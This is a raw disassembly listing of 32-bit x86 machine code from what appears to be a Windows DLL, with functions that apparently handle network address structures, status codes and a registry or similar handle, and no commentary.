1000b0d5:	66 89 45 ee          	mov    %ax,-0x12(%ebp)
1000b0d9:	c7 45 f0 00 00 00 06 	movl   $0x6000000,-0x10(%ebp)
1000b0e0:	ff d7                	call   *%edi
1000b0e2:	6a 08                	push   $0x8
1000b0e4:	66 89 45 d8          	mov    %ax,-0x28(%ebp)
1000b0e8:	ff d7                	call   *%edi
1000b0ea:	ff 75 0c             	pushl  0xc(%ebp)
1000b0ed:	66 89 45 da          	mov    %ax,-0x26(%ebp)
1000b0f1:	ff 75 f8             	pushl  -0x8(%ebp)
1000b0f4:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
1000b0fa:	50                   	push   %eax
1000b0fb:	0f b7 43 0c          	movzwl 0xc(%ebx),%eax
1000b0ff:	6a 1c                	push   $0x1c
1000b101:	50                   	push   %eax
1000b102:	ff 73 08             	pushl  0x8(%ebx)
1000b105:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000b108:	53                   	push   %ebx
1000b109:	8d 5d d8             	lea    -0x28(%ebp),%ebx
1000b10c:	e8 e9 fc ff ff       	call   0x1000adfa
1000b111:	85 c0                	test   %eax,%eax
1000b113:	0f 85 8e 00 00 00    	jne    0x1000b1a7
1000b119:	8d b5 40 ff ff ff    	lea    -0xc0(%ebp),%esi
1000b11f:	e8 c3 fc ff ff       	call   0x1000ade7
1000b124:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000b127:	3b 41 10             	cmp    0x10(%ecx),%eax
1000b12a:	0f 85 b3 fe ff ff    	jne    0x1000afe3
1000b130:	c7 41 04 03 00 00 00 	movl   $0x3,0x4(%ecx)
1000b137:	e9 ef fe ff ff       	jmp    0x1000b02b
1000b13c:	8b 3d 70 e2 00 10    	mov    0x1000e270,%edi
1000b142:	6a 03                	push   $0x3
1000b144:	c7 46 04 02 00 00 00 	movl   $0x2,0x4(%esi)
1000b14b:	ff d7                	call   *%edi
1000b14d:	6a 04                	push   $0x4
1000b14f:	66 89 45 ec          	mov    %ax,-0x14(%ebp)
1000b153:	ff d7                	call   *%edi
1000b155:	6a 01                	push   $0x1
1000b157:	66 89 45 ee          	mov    %ax,-0x12(%ebp)
1000b15b:	c7 45 f0 00 00 00 06 	movl   $0x6000000,-0x10(%ebp)
1000b162:	ff d7                	call   *%edi
1000b164:	6a 08                	push   $0x8
1000b166:	66 89 45 d8          	mov    %ax,-0x28(%ebp)
1000b16a:	ff d7                	call   *%edi
1000b16c:	ff 75 0c             	pushl  0xc(%ebp)
1000b16f:	66 89 45 da          	mov    %ax,-0x26(%ebp)
1000b173:	ff 75 f8             	pushl  -0x8(%ebp)
1000b176:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
1000b17c:	50                   	push   %eax
1000b17d:	0f b7 46 0c          	movzwl 0xc(%esi),%eax
1000b181:	6a 1c                	push   $0x1c
1000b183:	50                   	push   %eax
1000b184:	ff 76 08             	pushl  0x8(%esi)
1000b187:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000b18a:	56                   	push   %esi
1000b18b:	8d 5d d8             	lea    -0x28(%ebp),%ebx
1000b18e:	e8 67 fc ff ff       	call   0x1000adfa
1000b193:	85 c0                	test   %eax,%eax
1000b195:	0f 85 90 fe ff ff    	jne    0x1000b02b
1000b19b:	c7 46 04 01 00 00 00 	movl   $0x1,0x4(%esi)
1000b1a2:	e9 84 fe ff ff       	jmp    0x1000b02b
1000b1a7:	3d 02 01 00 00       	cmp    $0x102,%eax
1000b1ac:	0f 85 45 01 00 00    	jne    0x1000b2f7
1000b1b2:	68 90 01 00 00       	push   $0x190
1000b1b7:	ff 15 44 e1 00 10    	call   *0x1000e144
1000b1bd:	ff 75 08             	pushl  0x8(%ebp)
1000b1c0:	e8 fb fb ff ff       	call   0x1000adc0
1000b1c5:	6a 01                	push   $0x1
1000b1c7:	ff d7                	call   *%edi
1000b1c9:	ff 75 0c             	pushl  0xc(%ebp)
1000b1cc:	66 89 45 c4          	mov    %ax,-0x3c(%ebp)
1000b1d0:	ff 75 f8             	pushl  -0x8(%ebp)
1000b1d3:	33 c0                	xor    %eax,%eax
1000b1d5:	66 89 45 c6          	mov    %ax,-0x3a(%ebp)
1000b1d9:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
1000b1df:	50                   	push   %eax
1000b1e0:	6a 14                	push   $0x14
1000b1e2:	ff 75 0c             	pushl  0xc(%ebp)
1000b1e5:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000b1e8:	ff 75 f8             	pushl  -0x8(%ebp)
1000b1eb:	8d 5d c4             	lea    -0x3c(%ebp),%ebx
1000b1ee:	ff 75 08             	pushl  0x8(%ebp)
1000b1f1:	e8 04 fc ff ff       	call   0x1000adfa
1000b1f6:	85 c0                	test   %eax,%eax
1000b1f8:	0f 85 f4 00 00 00    	jne    0x1000b2f2
1000b1fe:	6a 01                	push   $0x1
1000b200:	8d b5 40 ff ff ff    	lea    -0xc0(%ebp),%esi
1000b206:	e8 60 fb ff ff       	call   0x1000ad6b
1000b20b:	8b d8                	mov    %eax,%ebx
1000b20d:	59                   	pop    %ecx
1000b20e:	85 db                	test   %ebx,%ebx
1000b210:	0f 84 cd fd ff ff    	je     0x1000afe3
1000b216:	0f b7 43 02          	movzwl 0x2(%ebx),%eax
1000b21a:	50                   	push   %eax
1000b21b:	ff 15 28 e2 00 10    	call   *0x1000e228
1000b221:	66 83 f8 08          	cmp    $0x8,%ax
1000b225:	0f 82 b8 fd ff ff    	jb     0x1000afe3
1000b22b:	80 7b 05 01          	cmpb   $0x1,0x5(%ebx)
1000b22f:	0f 85 c9 fd ff ff    	jne    0x1000affe
1000b235:	8b 43 08             	mov    0x8(%ebx),%eax
1000b238:	8b 75 08             	mov    0x8(%ebp),%esi
1000b23b:	3b 46 10             	cmp    0x10(%esi),%eax
1000b23e:	0f 85 9f fd ff ff    	jne    0x1000afe3
1000b244:	0f b7 43 06          	movzwl 0x6(%ebx),%eax
1000b248:	66 85 c0             	test   %ax,%ax
1000b24b:	74 12                	je     0x1000b25f
1000b24d:	66 3b 46 14          	cmp    0x14(%esi),%ax
1000b251:	74 0c                	je     0x1000b25f
1000b253:	c7 46 04 06 00 00 00 	movl   $0x6,0x4(%esi)
1000b25a:	e9 cc fd ff ff       	jmp    0x1000b02b
1000b25f:	68 f4 01 00 00       	push   $0x1f4
1000b264:	ff 15 44 e1 00 10    	call   *0x1000e144
1000b26a:	56                   	push   %esi
1000b26b:	e8 50 fb ff ff       	call   0x1000adc0
1000b270:	6a 03                	push   $0x3
1000b272:	ff d7                	call   *%edi
1000b274:	6a 04                	push   $0x4
1000b276:	66 89 45 ec          	mov    %ax,-0x14(%ebp)
1000b27a:	ff d7                	call   *%edi
1000b27c:	6a 01                	push   $0x1
1000b27e:	66 89 45 ee          	mov    %ax,-0x12(%ebp)
1000b282:	c7 45 f0 00 00 00 02 	movl   $0x2000000,-0x10(%ebp)
1000b289:	ff d7                	call   *%edi
1000b28b:	6a 08                	push   $0x8
1000b28d:	66 89 45 d8          	mov    %ax,-0x28(%ebp)
1000b291:	ff d7                	call   *%edi
1000b293:	6a 00                	push   $0x0
1000b295:	66 89 45 da          	mov    %ax,-0x26(%ebp)
1000b299:	8b 46 08             	mov    0x8(%esi),%eax
1000b29c:	50                   	push   %eax
1000b29d:	8d 8d 40 ff ff ff    	lea    -0xc0(%ebp),%ecx
1000b2a3:	51                   	push   %ecx
1000b2a4:	0f b7 4e 0c          	movzwl 0xc(%esi),%ecx
1000b2a8:	6a 1c                	push   $0x1c
1000b2aa:	51                   	push   %ecx
1000b2ab:	50                   	push   %eax
1000b2ac:	56                   	push   %esi
1000b2ad:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000b2b0:	8d 5d d8             	lea    -0x28(%ebp),%ebx
1000b2b3:	e8 42 fb ff ff       	call   0x1000adfa
1000b2b8:	85 c0                	test   %eax,%eax
1000b2ba:	75 23                	jne    0x1000b2df
1000b2bc:	8d b5 40 ff ff ff    	lea    -0xc0(%ebp),%esi
1000b2c2:	e8 20 fb ff ff       	call   0x1000ade7
1000b2c7:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000b2ca:	3b 41 10             	cmp    0x10(%ecx),%eax
1000b2cd:	0f 85 10 fd ff ff    	jne    0x1000afe3
1000b2d3:	c7 41 04 04 00 00 00 	movl   $0x4,0x4(%ecx)
1000b2da:	e9 4c fd ff ff       	jmp    0x1000b02b
1000b2df:	3d 02 01 00 00       	cmp    $0x102,%eax
1000b2e4:	75 11                	jne    0x1000b2f7
1000b2e6:	c7 46 04 05 00 00 00 	movl   $0x5,0x4(%esi)
1000b2ed:	e9 39 fd ff ff       	jmp    0x1000b02b
1000b2f2:	b8 d0 04 00 00       	mov    $0x4d0,%eax
1000b2f7:	5f                   	pop    %edi
1000b2f8:	5e                   	pop    %esi
1000b2f9:	5b                   	pop    %ebx
1000b2fa:	c9                   	leave  
1000b2fb:	c2 08 00             	ret    $0x8
1000b2fe:	56                   	push   %esi
1000b2ff:	8d 77 08             	lea    0x8(%edi),%esi
1000b302:	e8 bf ef ff ff       	call   0x1000a2c6
1000b307:	8b c7                	mov    %edi,%eax
1000b309:	5e                   	pop    %esi
1000b30a:	c3                   	ret    
1000b30b:	83 c1 08             	add    $0x8,%ecx
1000b30e:	e9 f7 ef ff ff       	jmp    0x1000a30a
1000b313:	83 c1 08             	add    $0x8,%ecx
1000b316:	8b 01                	mov    (%ecx),%eax
1000b318:	ff 50 08             	call   *0x8(%eax)
1000b31b:	0f b6 c0             	movzbl %al,%eax
1000b31e:	c3                   	ret    
1000b31f:	55                   	push   %ebp
1000b320:	8b ec                	mov    %esp,%ebp
1000b322:	83 ec 2c             	sub    $0x2c,%esp
1000b325:	53                   	push   %ebx
1000b326:	57                   	push   %edi
1000b327:	33 ff                	xor    %edi,%edi
1000b329:	8d 45 d8             	lea    -0x28(%ebp),%eax
1000b32c:	89 3e                	mov    %edi,(%esi)
1000b32e:	e8 cd f8 ff ff       	call   0x1000ac00
1000b333:	e8 58 f8 ff ff       	call   0x1000ab90
1000b338:	8b c8                	mov    %eax,%ecx
1000b33a:	89 4d f4             	mov    %ecx,-0xc(%ebp)
1000b33d:	83 f9 ff             	cmp    $0xffffffff,%ecx
1000b340:	75 0b                	jne    0x1000b34d
1000b342:	ff 15 64 e2 00 10    	call   *0x1000e264
1000b348:	e9 8d 00 00 00       	jmp    0x1000b3da
1000b34d:	8d 45 d8             	lea    -0x28(%ebp),%eax
1000b350:	e8 ca f8 ff ff       	call   0x1000ac1f
1000b355:	8d 46 08             	lea    0x8(%esi),%eax
1000b358:	89 7d fc             	mov    %edi,-0x4(%ebp)
1000b35b:	89 7d f8             	mov    %edi,-0x8(%ebp)
1000b35e:	e8 3b f0 ff ff       	call   0x1000a39e
1000b363:	85 c0                	test   %eax,%eax
1000b365:	74 5a                	je     0x1000b3c1
1000b367:	83 7d f8 05          	cmpl   $0x5,-0x8(%ebp)
1000b36b:	73 54                	jae    0x1000b3c1
1000b36d:	ff 75 fc             	pushl  -0x4(%ebp)
1000b370:	8d 4e 08             	lea    0x8(%esi),%ecx
1000b373:	e8 f3 ef ff ff       	call   0x1000a36b
1000b378:	8b 18                	mov    (%eax),%ebx
1000b37a:	8d 4d d8             	lea    -0x28(%ebp),%ecx
1000b37d:	51                   	push   %ecx
1000b37e:	e8 b1 f8 ff ff       	call   0x1000ac34
1000b383:	85 c0                	test   %eax,%eax
1000b385:	74 13                	je     0x1000b39a
1000b387:	ff 75 08             	pushl  0x8(%ebp)
1000b38a:	8d 45 d8             	lea    -0x28(%ebp),%eax
1000b38d:	50                   	push   %eax
1000b38e:	e8 dd fb ff ff       	call   0x1000af70
1000b393:	85 c0                	test   %eax,%eax
1000b395:	74 15                	je     0x1000b3ac
1000b397:	ff 45 f8             	incl   -0x8(%ebp)
1000b39a:	ff 45 fc             	incl   -0x4(%ebp)
1000b39d:	8d 46 08             	lea    0x8(%esi),%eax
1000b3a0:	e8 f9 ef ff ff       	call   0x1000a39e
1000b3a5:	39 45 fc             	cmp    %eax,-0x4(%ebp)
1000b3a8:	72 bd                	jb     0x1000b367
1000b3aa:	eb 15                	jmp    0x1000b3c1
1000b3ac:	8d 45 d8             	lea    -0x28(%ebp),%eax
1000b3af:	e8 54 f9 ff ff       	call   0x1000ad08
1000b3b4:	89 46 04             	mov    %eax,0x4(%esi)
1000b3b7:	8d 45 d8             	lea    -0x28(%ebp),%eax
1000b3ba:	e8 21 00 00 00       	call   0x1000b3e0
1000b3bf:	89 06                	mov    %eax,(%esi)
1000b3c1:	ff 75 f4             	pushl  -0xc(%ebp)
1000b3c4:	ff 15 84 e2 00 10    	call   *0x1000e284
1000b3ca:	8b 06                	mov    (%esi),%eax
1000b3cc:	f7 d8                	neg    %eax
1000b3ce:	1b c0                	sbb    %eax,%eax
1000b3d0:	25 b1 fa ff ff       	and    $0xfffffab1,%eax
1000b3d5:	05 4f 05 00 00       	add    $0x54f,%eax
1000b3da:	5f                   	pop    %edi
1000b3db:	5b                   	pop    %ebx
1000b3dc:	c9                   	leave  
1000b3dd:	c2 04 00             	ret    $0x4
1000b3e0:	8b 40 04             	mov    0x4(%eax),%eax
1000b3e3:	c3                   	ret    
1000b3e4:	53                   	push   %ebx
1000b3e5:	56                   	push   %esi
1000b3e6:	57                   	push   %edi
1000b3e7:	8d 78 08             	lea    0x8(%eax),%edi
1000b3ea:	8b c7                	mov    %edi,%eax
1000b3ec:	e8 a5 ef ff ff       	call   0x1000a396
1000b3f1:	e8 37 a6 ff ff       	call   0x10005a2d
1000b3f6:	8b d8                	mov    %eax,%ebx
1000b3f8:	33 f6                	xor    %esi,%esi
1000b3fa:	85 db                	test   %ebx,%ebx
1000b3fc:	7e 1c                	jle    0x1000b41a
1000b3fe:	56                   	push   %esi
1000b3ff:	e8 52 a6 ff ff       	call   0x10005a56
1000b404:	59                   	pop    %ecx
1000b405:	85 c0                	test   %eax,%eax
1000b407:	74 1d                	je     0x1000b426
1000b409:	50                   	push   %eax
1000b40a:	8b cf                	mov    %edi,%ecx
1000b40c:	e8 13 ef ff ff       	call   0x1000a324
1000b411:	84 c0                	test   %al,%al
1000b413:	74 11                	je     0x1000b426
1000b415:	46                   	inc    %esi
1000b416:	3b f3                	cmp    %ebx,%esi
1000b418:	7c e4                	jl     0x1000b3fe
1000b41a:	e8 94 ef ff ff       	call   0x1000a3b3
1000b41f:	33 c0                	xor    %eax,%eax
1000b421:	40                   	inc    %eax
1000b422:	5f                   	pop    %edi
1000b423:	5e                   	pop    %esi
1000b424:	5b                   	pop    %ebx
1000b425:	c3                   	ret    
1000b426:	33 c0                	xor    %eax,%eax
1000b428:	eb f8                	jmp    0x1000b422
1000b42a:	55                   	push   %ebp
1000b42b:	8b ec                	mov    %esp,%ebp
1000b42d:	83 ec 38             	sub    $0x38,%esp
1000b430:	53                   	push   %ebx
1000b431:	56                   	push   %esi
1000b432:	57                   	push   %edi
1000b433:	8d 7d cc             	lea    -0x34(%ebp),%edi
1000b436:	33 db                	xor    %ebx,%ebx
1000b438:	e8 c1 fe ff ff       	call   0x1000b2fe
1000b43d:	8b cf                	mov    %edi,%ecx
1000b43f:	e8 cf fe ff ff       	call   0x1000b313
1000b444:	85 c0                	test   %eax,%eax
1000b446:	74 75                	je     0x1000b4bd
1000b448:	8b c7                	mov    %edi,%eax
1000b44a:	e8 95 ff ff ff       	call   0x1000b3e4
1000b44f:	85 c0                	test   %eax,%eax
1000b451:	74 6a                	je     0x1000b4bd
1000b453:	33 c0                	xor    %eax,%eax
1000b455:	39 5d 08             	cmp    %ebx,0x8(%ebp)
1000b458:	8b f7                	mov    %edi,%esi
1000b45a:	0f 94 c0             	sete   %al
1000b45d:	50                   	push   %eax
1000b45e:	e8 bc fe ff ff       	call   0x1000b31f
1000b463:	85 c0                	test   %eax,%eax
1000b465:	75 56                	jne    0x1000b4bd
1000b467:	6a 10                	push   $0x10
1000b469:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000b46c:	53                   	push   %ebx
1000b46d:	50                   	push   %eax
1000b46e:	e8 b7 28 00 00       	call   0x1000dd2a
1000b473:	83 c4 0c             	add    $0xc,%esp
1000b476:	6a 02                	push   $0x2
1000b478:	58                   	pop    %eax
1000b479:	66 89 45 ec          	mov    %ax,-0x14(%ebp)
1000b47d:	8b c7                	mov    %edi,%eax
1000b47f:	e8 5c ff ff ff       	call   0x1000b3e0
1000b484:	89 45 f0             	mov    %eax,-0x10(%ebp)
1000b487:	83 f8 ff             	cmp    $0xffffffff,%eax
1000b48a:	74 27                	je     0x1000b4b3
1000b48c:	3b c3                	cmp    %ebx,%eax
1000b48e:	74 23                	je     0x1000b4b3
1000b490:	68 80 00 00 00       	push   $0x80
1000b495:	53                   	push   %ebx
1000b496:	be 48 32 01 10       	mov    $0x10013248,%esi
1000b49b:	56                   	push   %esi
1000b49c:	e8 89 28 00 00       	call   0x1000dd2a
1000b4a1:	83 c4 0c             	add    $0xc,%esp
1000b4a4:	6a 10                	push   $0x10
1000b4a6:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000b4a9:	50                   	push   %eax
1000b4aa:	56                   	push   %esi
1000b4ab:	e8 60 28 00 00       	call   0x1000dd10
1000b4b0:	83 c4 0c             	add    $0xc,%esp
1000b4b3:	8d 45 cc             	lea    -0x34(%ebp),%eax
1000b4b6:	e8 d3 d0 ff ff       	call   0x1000858e
1000b4bb:	8b d8                	mov    %eax,%ebx
1000b4bd:	8d 4d cc             	lea    -0x34(%ebp),%ecx
1000b4c0:	e8 46 fe ff ff       	call   0x1000b30b
1000b4c5:	5f                   	pop    %edi
1000b4c6:	5e                   	pop    %esi
1000b4c7:	8b c3                	mov    %ebx,%eax
1000b4c9:	5b                   	pop    %ebx
1000b4ca:	c9                   	leave  
1000b4cb:	c3                   	ret    
1000b4cc:	55                   	push   %ebp
1000b4cd:	8b ec                	mov    %esp,%ebp
1000b4cf:	81 ec 3c 04 00 00    	sub    $0x43c,%esp
1000b4d5:	53                   	push   %ebx
1000b4d6:	56                   	push   %esi
1000b4d7:	57                   	push   %edi
1000b4d8:	33 f6                	xor    %esi,%esi
1000b4da:	56                   	push   %esi
1000b4db:	56                   	push   %esi
1000b4dc:	56                   	push   %esi
1000b4dd:	56                   	push   %esi
1000b4de:	68 c0 e2 00 10       	push   $0x1000e2c0
1000b4e3:	89 75 fc             	mov    %esi,-0x4(%ebp)
1000b4e6:	ff 15 04 e2 00 10    	call   *0x1000e204
1000b4ec:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000b4ef:	3b c6                	cmp    %esi,%eax
1000b4f1:	0f 84 b0 00 00 00    	je     0x1000b5a7
1000b4f7:	56                   	push   %esi
1000b4f8:	56                   	push   %esi
1000b4f9:	56                   	push   %esi
1000b4fa:	56                   	push   %esi
1000b4fb:	68 a4 f1 00 10       	push   $0x1000f1a4
1000b500:	50                   	push   %eax
1000b501:	ff 15 14 e2 00 10    	call   *0x1000e214
1000b507:	8b d8                	mov    %eax,%ebx
1000b509:	3b de                	cmp    %esi,%ebx
1000b50b:	0f 84 8d 00 00 00    	je     0x1000b59e
1000b511:	bf 18 04 00 00       	mov    $0x418,%edi
1000b516:	57                   	push   %edi
1000b517:	8d 85 c8 fb ff ff    	lea    -0x438(%ebp),%eax
1000b51d:	56                   	push   %esi
1000b51e:	50                   	push   %eax
1000b51f:	e8 06 28 00 00       	call   0x1000dd2a
1000b524:	83 c4 0c             	add    $0xc,%esp
1000b527:	8d 45 f4             	lea    -0xc(%ebp),%eax
1000b52a:	50                   	push   %eax
1000b52b:	57                   	push   %edi
1000b52c:	8d 85 c8 fb ff ff    	lea    -0x438(%ebp),%eax
1000b532:	50                   	push   %eax
1000b533:	53                   	push   %ebx
1000b534:	89 75 f4             	mov    %esi,-0xc(%ebp)
1000b537:	ff 15 f0 e1 00 10    	call   *0x1000e1f0
1000b53d:	85 c0                	test   %eax,%eax
1000b53f:	74 56                	je     0x1000b597
1000b541:	6a 10                	push   $0x10
1000b543:	8d 45 e4             	lea    -0x1c(%ebp),%eax
1000b546:	56                   	push   %esi
1000b547:	50                   	push   %eax
1000b548:	e8 dd 27 00 00       	call   0x1000dd2a
1000b54d:	83 c4 0c             	add    $0xc,%esp
1000b550:	6a 02                	push   $0x2
1000b552:	58                   	pop    %eax
1000b553:	66 89 45 e4          	mov    %ax,-0x1c(%ebp)
1000b557:	8d 85 c8 fb ff ff    	lea    -0x438(%ebp),%eax
1000b55d:	50                   	push   %eax
1000b55e:	ff 15 54 e2 00 10    	call   *0x1000e254
1000b564:	89 45 e8             	mov    %eax,-0x18(%ebp)
1000b567:	83 f8 ff             	cmp    $0xffffffff,%eax
1000b56a:	74 2b                	je     0x1000b597
1000b56c:	3b c6                	cmp    %esi,%eax
1000b56e:	74 27                	je     0x1000b597
1000b570:	68 80 00 00 00       	push   $0x80
1000b575:	56                   	push   %esi
1000b576:	be 48 32 01 10       	mov    $0x10013248,%esi
1000b57b:	56                   	push   %esi
1000b57c:	e8 a9 27 00 00       	call   0x1000dd2a
1000b581:	6a 10                	push   $0x10
1000b583:	8d 45 e4             	lea    -0x1c(%ebp),%eax
1000b586:	50                   	push   %eax
1000b587:	56                   	push   %esi
1000b588:	e8 83 27 00 00       	call   0x1000dd10
1000b58d:	83 c4 18             	add    $0x18,%esp
1000b590:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
1000b597:	53                   	push   %ebx
1000b598:	ff 15 0c e2 00 10    	call   *0x1000e20c
1000b59e:	ff 75 f8             	pushl  -0x8(%ebp)
1000b5a1:	ff 15 0c e2 00 10    	call   *0x1000e20c
1000b5a7:	8b 45 fc             	mov    -0x4(%ebp),%eax
1000b5aa:	5f                   	pop    %edi
1000b5ab:	5e                   	pop    %esi
1000b5ac:	5b                   	pop    %ebx
1000b5ad:	c9                   	leave  
1000b5ae:	c3                   	ret    
1000b5af:	55                   	push   %ebp
1000b5b0:	8b ec                	mov    %esp,%ebp
1000b5b2:	83 e4 f8             	and    $0xfffffff8,%esp
1000b5b5:	83 3d 7c 38 01 10 00 	cmpl   $0x0,0x1001387c
1000b5bc:	75 36                	jne    0x1000b5f4
1000b5be:	56                   	push   %esi
1000b5bf:	e8 66 fe ff ff       	call   0x1000b42a
1000b5c4:	59                   	pop    %ecx
1000b5c5:	33 c9                	xor    %ecx,%ecx
1000b5c7:	85 c0                	test   %eax,%eax
1000b5c9:	0f 95 c1             	setne  %cl
1000b5cc:	a3 c8 32 01 10       	mov    %eax,0x100132c8
1000b5d1:	8b c1                	mov    %ecx,%eax
1000b5d3:	a3 7c 38 01 10       	mov    %eax,0x1001387c
1000b5d8:	85 c0                	test   %eax,%eax
1000b5da:	75 18                	jne    0x1000b5f4
1000b5dc:	c7 05 c8 32 01 10 63 	movl   $0x63,0x100132c8
1000b5e3:	00 00 00 
1000b5e6:	e8 e1 fe ff ff       	call   0x1000b4cc
1000b5eb:	a3 7c 38 01 10       	mov    %eax,0x1001387c
1000b5f0:	85 c0                	test   %eax,%eax
1000b5f2:	74 20                	je     0x1000b614
1000b5f4:	68 80 00 00 00       	push   $0x80
1000b5f9:	68 48 32 01 10       	push   $0x10013248
1000b5fe:	ff 75 08             	pushl  0x8(%ebp)
1000b601:	e8 0a 27 00 00       	call   0x1000dd10
1000b606:	83 c4 0c             	add    $0xc,%esp
1000b609:	85 f6                	test   %esi,%esi
1000b60b:	74 07                	je     0x1000b614
1000b60d:	a1 c8 32 01 10       	mov    0x100132c8,%eax
1000b612:	89 06                	mov    %eax,(%esi)
1000b614:	a1 7c 38 01 10       	mov    0x1001387c,%eax
1000b619:	8b e5                	mov    %ebp,%esp
1000b61b:	5d                   	pop    %ebp
1000b61c:	c3                   	ret    
1000b61d:	83 f8 01             	cmp    $0x1,%eax
1000b620:	75 06                	jne    0x1000b628
1000b622:	b8 bc f1 00 10       	mov    $0x1000f1bc,%eax
1000b627:	c3                   	ret    
1000b628:	83 f8 03             	cmp    $0x3,%eax
1000b62b:	75 06                	jne    0x1000b633
1000b62d:	b8 c4 f1 00 10       	mov    $0x1000f1c4,%eax
1000b632:	c3                   	ret    
1000b633:	83 f8 02             	cmp    $0x2,%eax
1000b636:	75 06                	jne    0x1000b63e
1000b638:	b8 d4 f1 00 10       	mov    $0x1000f1d4,%eax
1000b63d:	c3                   	ret    
1000b63e:	83 f8 05             	cmp    $0x5,%eax
1000b641:	75 06                	jne    0x1000b649
1000b643:	b8 e4 f1 00 10       	mov    $0x1000f1e4,%eax
1000b648:	c3                   	ret    
1000b649:	83 f8 04             	cmp    $0x4,%eax
1000b64c:	75 06                	jne    0x1000b654
1000b64e:	b8 f8 f1 00 10       	mov    $0x1000f1f8,%eax
1000b653:	c3                   	ret    
1000b654:	83 f8 06             	cmp    $0x6,%eax
1000b657:	b8 10 f2 00 10       	mov    $0x1000f210,%eax
1000b65c:	74 05                	je     0x1000b663
1000b65e:	b8 20 f2 00 10       	mov    $0x1000f220,%eax
1000b663:	c3                   	ret    
1000b664:	55                   	push   %ebp
1000b665:	8b ec                	mov    %esp,%ebp
1000b667:	33 c0                	xor    %eax,%eax
1000b669:	57                   	push   %edi
1000b66a:	ff 75 08             	pushl  0x8(%ebp)
1000b66d:	c7 06 02 00 00 80    	movl   $0x80000002,(%esi)
1000b673:	89 46 04             	mov    %eax,0x4(%esi)
1000b676:	89 46 08             	mov    %eax,0x8(%esi)
1000b679:	89 46 0c             	mov    %eax,0xc(%esi)
1000b67c:	c7 46 10 00 50 00 00 	movl   $0x5000,0x10(%esi)
1000b683:	88 46 14             	mov    %al,0x14(%esi)
1000b686:	ff 15 6c e0 00 10    	call   *0x1000e06c
1000b68c:	8b f8                	mov    %eax,%edi
1000b68e:	03 ff                	add    %edi,%edi
1000b690:	74 7e                	je     0x1000b710
1000b692:	53                   	push   %ebx
1000b693:	8d 5f 02             	lea    0x2(%edi),%ebx
1000b696:	53                   	push   %ebx
1000b697:	e8 48 b3 ff ff       	call   0x100069e4
1000b69c:	53                   	push   %ebx
1000b69d:	6a 00                	push   $0x0
1000b69f:	50                   	push   %eax
1000b6a0:	89 46 04             	mov    %eax,0x4(%esi)
1000b6a3:	e8 82 26 00 00       	call   0x1000dd2a
1000b6a8:	57                   	push   %edi
1000b6a9:	ff 75 08             	pushl  0x8(%ebp)
1000b6ac:	ff 76 04             	pushl  0x4(%esi)
1000b6af:	e8 5c 26 00 00       	call   0x1000dd10
1000b6b4:	83 c4 1c             	add    $0x1c,%esp
1000b6b7:	bb 1c f3 00 10       	mov    $0x1000f31c,%ebx
1000b6bc:	53                   	push   %ebx
1000b6bd:	ff 15 6c e0 00 10    	call   *0x1000e06c
1000b6c3:	8b f8                	mov    %eax,%edi
1000b6c5:	03 ff                	add    %edi,%edi
1000b6c7:	74 46                	je     0x1000b70f
1000b6c9:	8d 47 02             	lea    0x2(%edi),%eax
1000b6cc:	50                   	push   %eax
1000b6cd:	e8 12 b3 ff ff       	call   0x100069e4
1000b6d2:	8d 4f 02             	lea    0x2(%edi),%ecx
1000b6d5:	51                   	push   %ecx
1000b6d6:	6a 00                	push   $0x0
1000b6d8:	50                   	push   %eax
1000b6d9:	89 46 08             	mov    %eax,0x8(%esi)
1000b6dc:	e8 49 26 00 00       	call   0x1000dd2a
1000b6e1:	57                   	push   %edi
1000b6e2:	53                   	push   %ebx
1000b6e3:	ff 76 08             	pushl  0x8(%esi)
1000b6e6:	e8 25 26 00 00       	call   0x1000dd10
1000b6eb:	ff 76 10             	pushl  0x10(%esi)
1000b6ee:	e8 f1 b2 ff ff       	call   0x100069e4
1000b6f3:	83 c4 20             	add    $0x20,%esp
1000b6f6:	89 46 0c             	mov    %eax,0xc(%esi)
1000b6f9:	85 c0                	test   %eax,%eax
1000b6fb:	74 12                	je     0x1000b70f
1000b6fd:	ff 76 10             	pushl  0x10(%esi)
1000b700:	6a 00                	push   $0x0
1000b702:	50                   	push   %eax
1000b703:	e8 22 26 00 00       	call   0x1000dd2a
1000b708:	83 c4 0c             	add    $0xc,%esp
1000b70b:	c6 46 14 01          	movb   $0x1,0x14(%esi)
1000b70f:	5b                   	pop    %ebx
1000b710:	8b c6                	mov    %esi,%eax
1000b712:	5f                   	pop    %edi
1000b713:	5d                   	pop    %ebp
1000b714:	c2 04 00             	ret    $0x4
1000b717:	56                   	push   %esi
1000b718:	8b f0                	mov    %eax,%esi
1000b71a:	8b 46 0c             	mov    0xc(%esi),%eax
1000b71d:	85 c0                	test   %eax,%eax
1000b71f:	74 07                	je     0x1000b728
1000b721:	50                   	push   %eax
1000b722:	e8 ec b2 ff ff       	call   0x10006a13
1000b727:	59                   	pop    %ecx
1000b728:	8b 46 04             	mov    0x4(%esi),%eax
1000b72b:	85 c0                	test   %eax,%eax
1000b72d:	74 07                	je     0x1000b736
1000b72f:	50                   	push   %eax
1000b730:	e8 de b2 ff ff       	call   0x10006a13
1000b735:	59                   	pop    %ecx
1000b736:	8b 76 08             	mov    0x8(%esi),%esi
1000b739:	85 f6                	test   %esi,%esi
1000b73b:	74 07                	je     0x1000b744
1000b73d:	56                   	push   %esi
1000b73e:	e8 d0 b2 ff ff       	call   0x10006a13
1000b743:	59                   	pop    %ecx
1000b744:	5e                   	pop    %esi
1000b745:	c3                   	ret    
1000b746:	55                   	push   %ebp
1000b747:	8b ec                	mov    %esp,%ebp
1000b749:	83 ec 24             	sub    $0x24,%esp
1000b74c:	56                   	push   %esi
1000b74d:	57                   	push   %edi
1000b74e:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000b751:	50                   	push   %eax
1000b752:	ff 73 04             	pushl  0x4(%ebx)
1000b755:	ff 33                	pushl  (%ebx)
